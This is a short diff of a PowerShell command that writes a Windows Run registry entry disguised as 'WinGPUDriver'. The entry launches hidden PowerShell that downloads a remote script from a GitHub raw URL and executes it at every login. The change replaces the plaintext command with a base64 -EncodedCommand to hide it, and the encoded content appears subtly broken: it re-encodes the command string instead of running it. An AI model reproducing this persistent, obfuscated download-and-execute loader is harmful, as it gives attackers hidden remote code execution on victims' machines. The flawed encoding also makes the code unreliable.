@@ -1,3 +1,3 @@
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 -Name "WinGPUDriver" `
--Value 'powershell -w hidden -Command "iex (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1\")"'
+-Value 'powershell.exe -WindowStyle Hidden -EncodedCommand JGNvZGUgPSAnaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSmlyaVdlaXNzL1ZlY3JhL21haW4vVmVjcmExLnBzMSIpJwokYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRjb2RlKQokZW5jb2RlZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGJ5dGVzKQo='
